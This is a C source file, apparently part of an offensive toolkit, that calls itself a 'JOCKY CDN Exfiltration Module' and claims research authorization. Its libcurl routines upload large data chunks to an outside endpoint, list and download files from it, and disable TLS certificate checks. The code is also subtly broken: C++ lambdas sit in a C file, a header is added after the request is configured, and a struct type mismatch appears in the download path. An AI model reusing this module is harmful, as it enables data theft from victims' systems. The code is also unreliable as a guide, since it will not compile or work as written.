/*
 * JOCKY CDN Exfiltration Module
 * Supports both local Caddy CDN and AWS S3/CloudFront
 * Authorized: Red Hat + IIT Bombay Cyber Security Team
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <openssl/sha.h>
#include "jocky_exfil.h"

#define MAX_METADATA_LEN 512
#define MAX_CHUNK_SIZE (100 * 1024 * 1024)
#define UPLOAD_TIMEOUT_MS 30000

typedef struct {
    char* memory;
    size_t size;
} UploadResponse;

static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp)
{
    size_t realsize = size * nmemb;
    UploadResponse* mem = (UploadResponse*)userp;

    char* ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) {
        fprintf(stderr, "[!] Not enough memory for upload response\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

int jocky_exfil_local_cdn(
    const char* endpoint_url,
    const char* filename,
    const char* auth_token,
    const void* data,
    uint32_t data_size,
    const char* metadata)
{
    CURL* curl;
    struct curl_slist* headers = NULL;
    UploadResponse response = {0};
    int result = -1;

    if (!endpoint_url || !filename || !data || data_size == 0) {
        return -1;
    }

    if (data_size > MAX_CHUNK_SIZE) {
        fprintf(stderr, "[!] Chunk size exceeds maximum (%u > %u)\n",
                data_size, MAX_CHUNK_SIZE);
        return -1;
    }

    curl = curl_easy_init();
    if (!curl) {
        return -1;
    }

    // Allocate response buffer
    response.memory = malloc(1);
    if (!response.memory) {
        curl_easy_cleanup(curl);
        return -1;
    }

    // Setup headers
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    if (auth_token) {
        char auth_header[512];
        snprintf(auth_header, sizeof(auth_header), "Authorization: %s", auth_token);
        headers = curl_slist_append(headers, auth_header);
    }

    // Configure request
    curl_easy_setopt(curl, CURLOPT_URL, endpoint_url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)data_size);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, UPLOAD_TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);

    // Add metadata as custom header if provided
    if (metadata) {
        char meta_header[MAX_METADATA_LEN + 32];
        snprintf(meta_header, sizeof(meta_header),
                "X-Research-Metadata: %s", metadata);
        headers = curl_slist_append(headers, meta_header);
    }

    // Perform request
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        long response_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

        if (response_code == 200 || response_code == 201) {
            fprintf(stdout, "[+] CDN upload successful: %s\n", filename);
            fprintf(stdout, "    Response: %s\n", response.memory);
            result = 0;
        } else {
            fprintf(stderr, "[!] CDN upload failed (HTTP %ld)\n", response_code);
            fprintf(stderr, "    Response: %s\n", response.memory);
            result = -1;
        }
    } else {
        fprintf(stderr, "[!] CDN upload error: %s\n", curl_easy_strerror(res));
        result = -1;
    }

    // Cleanup
    curl_slist_free_all(headers);
    free(response.memory);
    curl_easy_cleanup(curl);

    return result;
}

int jocky_exfil_list_cdn_files(
    const char* endpoint_url,
    const char* auth_token,
    char* out_response,
    size_t response_size)
{
    CURL* curl;
    struct curl_slist* headers = NULL;
    int result = -1;

    if (!endpoint_url) {
        return -1;
    }

    curl = curl_easy_init();
    if (!curl) {
        return -1;
    }

    // Setup headers
    headers = curl_slist_append(headers, "Accept: application/json");
    if (auth_token) {
        char auth_header[512];
        snprintf(auth_header, sizeof(auth_header), "Authorization: %s", auth_token);
        headers = curl_slist_append(headers, auth_header);
    }

    // Change endpoint to /list
    char list_url[512];
    snprintf(list_url, sizeof(list_url), "%s/../list", endpoint_url);

    // Configure request
    curl_easy_setopt(curl, CURLOPT_URL, list_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, UPLOAD_TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    // Write response to buffer
    struct {
        char* buf;
        size_t max_size;
        size_t size;
    } buf = {out_response, response_size, 0};

    auto write_to_buf = [](void* contents, size_t size, size_t nmemb, void* userp) -> size_t {
        size_t realsize = size * nmemb;
        auto* b = (decltype(buf)*)userp;
        if (b->size + realsize >= b->max_size) {
            return 0;
        }
        memcpy(b->buf + b->size, contents, realsize);
        b->size += realsize;
        b->buf[b->size] = 0;
        return realsize;
    };

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_buf);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&buf);

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        long response_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        if (response_code == 200) {
            fprintf(stdout, "[+] CDN file listing retrieved\n");
            result = 0;
        }
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return result;
}

int jocky_exfil_verify_cdn_hash(
    const void* data,
    uint32_t data_size,
    const char* expected_hash)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    char computed_hash[65];

    if (!data || !expected_hash) {
        return -1;
    }

    SHA256_Init(&sha256);
    SHA256_Update(&sha256, data, data_size);
    SHA256_Final(hash, &sha256);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(computed_hash + (i * 2), "%02x", hash[i]);
    }
    computed_hash[64] = 0;

    if (strcmp(computed_hash, expected_hash) == 0) {
        fprintf(stdout, "[+] Hash verification passed\n");
        return 0;
    } else {
        fprintf(stderr, "[!] Hash mismatch: computed %s, expected %s\n",
                computed_hash, expected_hash);
        return -1;
    }
}

int jocky_exfil_download_from_cdn(
    const char* endpoint_url,
    const char* auth_token,
    void** out_data,
    uint32_t* out_size)
{
    CURL* curl;
    struct curl_slist* headers = NULL;
    struct {
        void* data;
        size_t size;
        size_t capacity;
    } buffer = {malloc(1024), 0, 1024};
    int result = -1;

    if (!endpoint_url || !buffer.data) {
        return -1;
    }

    curl = curl_easy_init();
    if (!curl) {
        free(buffer.data);
        return -1;
    }

    // Setup headers
    if (auth_token) {
        char auth_header[512];
        snprintf(auth_header, sizeof(auth_header), "Authorization: %s", auth_token);
        headers = curl_slist_append(headers, auth_header);
    }

    // Configure request
    curl_easy_setopt(curl, CURLOPT_URL, endpoint_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, UPLOAD_TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&buffer);

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        long response_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        if (response_code == 200) {
            *out_data = buffer.data;
            *out_size = buffer.size;
            fprintf(stdout, "[+] Downloaded %u bytes from CDN\n", buffer.size);
            result = 0;
        }
    }

    if (result != 0) {
        free(buffer.data);
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return result;
}
